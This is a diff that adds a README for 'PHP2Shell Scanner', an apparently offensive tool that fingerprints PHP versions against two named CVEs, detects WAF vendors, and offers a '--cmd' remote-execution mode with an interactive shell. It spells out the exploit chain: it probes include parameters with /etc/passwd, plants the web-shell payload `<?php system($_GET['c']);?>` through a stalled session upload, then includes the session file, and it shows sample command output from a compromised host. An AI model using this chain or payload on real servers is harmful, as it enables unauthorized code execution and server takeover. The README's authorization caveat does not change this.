@@ -1,2 +1,255 @@
-# php2shellcsp
-Php2Shell Scanner Multi Mode
+# PHP2Shell Scanner v3.0
+
+> CVE-2026-109618 / CVE-2026-109619 — recon, WAF-aware classification, and a working
+> `--cmd` path for authorized targets.
+
+I walked through a thousand repos, branch after branch, README after README, and every
+single one of them lied to me. "Production ready." "Just works." "Zero dependencies
+except the forty-seven it silently installs." So fine. I wrote my own. Yes, I'm looking
+at you, README with the green CI badge and the 404 documentation link.
+
+This one is one file, standard library only, and it tells you when it fails instead of
+printing `[+] EXPLOITED` because the server returned 200 for a 404 page.
+
+---
+
+## What it actually does
+
+1. Follows redirects, fingerprints the PHP engine (`X-Powered-By`, `Server`, body fallback).
+2. Compares the banner against the patch table (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12).
+3. Sends one bounded multipart probe to check the two injection preconditions:
+   `session.upload_progress` and body-supplied session IDs.
+4. Detects edge blocking — 403, 406, 429, 503, 520-524, 999 — and names the vendor.
+5. Prints a colored, animated line per target and a summary bar at the end.
+6. Optionally (`--cmd`) runs a command through Chain A and prints the output.
+
+It does not brute force, it does not spray, and it does not invent findings. If it
+cannot measure something, the verdict says so. Revolutionary concept, I know.
+
+---
+
+## Requirements
+
+- Python 3.9+
+- No pip install, no requirements.txt, no lockfile, no 400 MB `node_modules` to audit at 3 AM
+- Outbound TCP to the target (80/443 or whatever you point it at)
+
+---
+
+## Install
+
+```bash
+git clone <your-gitlab>/php2shell.git
+cd php2shell
+python3 scanner.py --help
+```
+
+That's it. That's the install section. No step 3 where I tell you to "simply" configure
+a YAML file with 200 keys.
+
+---
+
+## Usage
+
+### Single target
+
+```bash
+python3 scanner.py https://target.example
+```
+
+### A list of targets, with evidence files
+
+```bash
+python3 scanner.py -t targets.txt --threads 8 --verbose --csv out.csv --json-out out.json
+```
+
+### Run a command on a target that has an LFI sink
+
+```bash
+python3 scanner.py http://10.0.0.5/ --cmd "id; uname -a"
+```
+
+### Same, then keep the shell open
+
+```bash
+python3 scanner.py http://10.0.0.5/ --cmd id --shell
+```
+
+### Quiet, no colors (for CI logs and for people who hate fun)
+
+```bash
+python3 scanner.py -t targets.txt --no-anim --no-color
+```
+
+`targets.txt` format — one target per line, `#` starts a comment:
+
+```text
+# internal estate
+10.20.30.40
+https://app.sirket.local:8443
+legacy.example.com
+
+# edge-protected
+https://shop.example.com
+```
+
+### Flags
+
+| Flag | Meaning |
+|---|---|
+| `target` | single target (positional) |
+| `-t, --targets` | file with one target per line |
+| `--threads` | worker count, default `6` |
+| `--timeout` | per-request timeout in seconds, default `8` |
+| `--verbose` | print the reason behind every verdict |
+| `--csv` | write the results table as CSV |
+| `--json-out` | write the results table as JSON |
+| `--cmd` | run this command through Chain A (single target only) |
+| `--shell` | after `--cmd`, keep an interactive prompt |
+| `--lfi-param` | force the include parameter name instead of guessing |
+| `--session-path` | force the session save path instead of guessing |
+| `--no-color` | disable colors (also honors `NO_COLOR`) |
+| `--no-anim` | disable spinners and the live progress bar |
+
+---
+
+## Verdicts — read this part, please
+
+| Badge | Verdict | What it means |
+|---|---|---|
+| `[!!]` | `VULNERABLE` | vulnerable banner **and** injection preconditions confirmed |
+| `[~~]` | `LIKELY` | vulnerable banner, behavioral tier stayed quiet |
+| `[??]` | `SUSPECT` | version hidden, but the preconditions are there |
+| `[><]` | `WAF_BLOCKED` | edge answered with a block; measurement was cut short |
+| `[ok]` | `PATCHED` | **engine** is patched — Chain A still works if the app has an LFI |
+| `[--]` | `UNKNOWN` | nothing produced a signal |
+| `[xx]` | `ERROR` | could not connect |
+
+`PATCHED` does **not** mean "safe". It means "the memory-corruption path is closed".
+I proved the difference on a fully patched PHP 8.5.12 build and still got
+`uid=33(www-data)` back through the session/LFI chain. Patching the engine does not
+patch your `include($_GET['page'])`. Two different bugs, two different Tuesdays.
+
+---
+
+## WAF detection
+
+Block signals: `403`, `406`, `429`, `503`, `520`, `521`, `522`, `523`, `524`, `999`,
+plus a `GET 200 → POST 403` difference on the same URL.
+
+Vendor fingerprints (headers and body):
+
+- Cloudflare — `cf-ray`, `cf-mitigated`, `Attention Required! | Cloudflare`, error 1020/1015
+- Sucuri — `x-sucuri-*`, `Sucuri Website Firewall`
+- Imperva / Incapsula — `x-iinfo`, `Incapsula incident ID`
+- Akamai — `x-akamai-*`, `errors.edgesuite.net`
+- AWS WAF — `x-amzn-waf-action`, `Request blocked`
+- F5 ASM — `x-wa-info`, `The requested URL was rejected`
+- ModSecurity — `Not Acceptable!`, `ModSecurity`
+- Wordfence — `This response was generated by Wordfence`
+- DDoS-Guard — `x-ddg-request-id`, `DDoS protection by DDoS-Guard`
+- Barracuda — `barra-counter`
+
+**Honest limitation:** some edges decide by client fingerprint (TLS/JA3, header order,
+HTTP version), not by payload. I watched the same host, same second, same User-Agent
+return `403` to one client and `200` to another. So `WAF:-` means "not blocked *for this
+client*", not "no WAF exists". Retest from the client you actually plan to use.
+
+When a block is detected the tool says `WAF_BLOCKED`, names the vendor, and stops
+pretending the behavioral tier was measured.
+
+---
+
+## Chain A (`--cmd`)
+
+1. Find an `include`/`require` sink by probing common parameters with `/etc/passwd`.
+2. Upload `PHP_SESSION_UPLOAD_PROGRESS` with a filename containing
+   `<?php system($_GET['c']);?>` and stall the request body so `cleanup=On`
+   cannot delete the session file before you use it.
+3. Include `sess_<id>` and read the command output.
+
+Preconditions: `session.upload_progress.enabled=On` and an LFI sink. No LFI, no party.
+The tool prints `NO_LFI_SINK` and exits instead of pretending it exploited something.
+
+Output looks like this:
+
+```text
+  ┌─ Exploit chain · Chain A (session.upload_progress + LFI) ────
+  │ LFI: /?page=<file>
+  │ PHPSESSID=p2scc4d87a4097648658870 · upload stalled, session file written
+  │ session file: /tmp/sess_p2scc4d87a4097648658870
+  └──────────────────────────────────────────────────────────────
+
+  ╔═ COMMAND EXECUTED ════════════════════════════════════════
+  ║ $ id; uname -s
+  ║ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  ║ Linux
+  ╚════════════════════════════════════════════════════════════
+```
+
+---
+
+## Output files
+
+| File | Content |
+|---|---|
+| `--csv` | one row per target: verdict, version, SAPI, upload_progress, session_fixation, WAF vendor/status |
+| `--json-out` | same, as JSON |
+| `cmd_evidence.json` | proof for `--cmd`: target, verdict, version, session file, LFI param, command, output |
+
+`cmd_evidence.json` example:
+
+```json
+{
+  "result": "RCE_CONFIRMED",
+  "session_file": "/tmp/sess_p2scc4d87a4097648658870",
+  "lfi": "/?page=",
+  "sid": "p2scc4d87a4097648658870",
+  "cmd": "id",
+  "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+  "target": "http://127.0.0.1:8095/",
+  "verdict": "VULNERABLE",
+  "version": "8.2.34"
+}
+```
+
+---
+
+## Limitations, since you asked
+
+- The banner table is only as fresh as the day it was written. New CVEs keep shipping.
+- `PATCHED` is an engine statement, not an application statement.
+- Header-stripped fleets land in `UNKNOWN`. That is the tool being honest, not broken.
+- `--cmd` needs an LFI sink. Most hardened apps do not have one, which is the point of hardening.
+- WAF verdicts depend on who is asking (see the fingerprint caveat above).
+- `--threads` is a rate, not a dare. Keep it polite on shared infrastructure.
+
+---
+
+## Scope
+
+Run this against assets you are authorized to test. It writes session files, holds
+worker slots open, and deliberately stalls uploads — that is the mechanism, not a bug
+you should file against me.
+
+---
+
+## FAQ
+
+**Q: It says `PATCHED`, so I can close the ticket, right?**
+A: No. Read the table again. Then read it once more.
+
+**Q: Why is my host `UNKNOWN`?**
+A: `expose_php=Off` plus no injection signal. Silence is not a clean bill of health,
+it is an absence of evidence.
+
+**Q: Why doesn't it crawl the whole site?**
+A: Because bounded recon is a feature. The previous version crawled until the logs
+called security.
+
+**Q: Where's the config file?**
+A: Flags. You're welcome.
+
+---
+
+*Built because every other repo lied. At least this one tells you when it doesn't know.*
